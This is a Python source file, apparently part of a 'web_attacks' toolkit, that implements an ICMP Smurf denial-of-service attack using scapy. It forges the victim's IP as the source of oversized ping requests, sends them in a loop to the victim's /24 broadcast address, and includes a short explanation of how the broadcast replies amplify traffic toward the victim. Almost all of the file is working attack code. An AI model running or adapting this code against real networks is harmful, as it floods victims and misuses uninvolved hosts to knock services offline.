from scapy.all import *
from scapy.layers.inet import IP, ICMP

from web_attacks.attack_parameters import AttackParameters
from web_attacks.attacks.attack import Attack

ICMP_PROTOCOL = "icmp"

SMURF_ICMP_PAYLOAD_DATA = "abcd"
LEN_OF_PAYLOAD_TO_SEND = 1000


class ICMPSmurfAttack(Attack):
    def perform_attack(self, attack_params: AttackParameters):
        successful_requests = 0
        broadcast_ip = self.__get_broadcast_ip_address(attack_params.target_ip)
        for packet in range(attack_params.num_of_requests):
            try:
                self.__send_spoofed_packet(attack_params.target_ip, broadcast_ip, SMURF_ICMP_PAYLOAD_DATA,
                                           LEN_OF_PAYLOAD_TO_SEND)
                successful_requests += 1
                print(
                    f"Done sending {packet + 1} packets. Sent ping request from {attack_params.target_ip} to {broadcast_ip}.")
            except Exception as e:
                print(f"An error occurred: {e}. Sent {successful_requests} packets.")
                continue

    def get_attack_description(self) -> str:
        return """An ICMP Smurf attack is a network-layer denial-of-service technique that abuses ICMP echo (ping) and IP-directed broadcasts to amplify traffic toward a victim. 
The attacker sends ICMP echo requests with the source address forged to be the victim’s IP and the destination set to a broadcast address of a network. 
Every host on that broadcast network replies to the forged source, multiplying traffic and overwhelming the victim."""

    def get_attack_name(self) -> str:
        return "ICMP Smurf Attack"

    def __send_spoofed_packet(self, target_ip: str, broadcast_ip: str, payload_data: str, len_to_send: int) -> None:
        ping_request = IP(src=target_ip, dst=broadcast_ip, proto=ICMP_PROTOCOL) / ICMP() / (payload_data * len_to_send)
        send(ping_request)

    def __get_broadcast_ip_address(self, target_ip: str) -> str:
        ip_parts = target_ip.split(".")
        return ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + "." + "255"
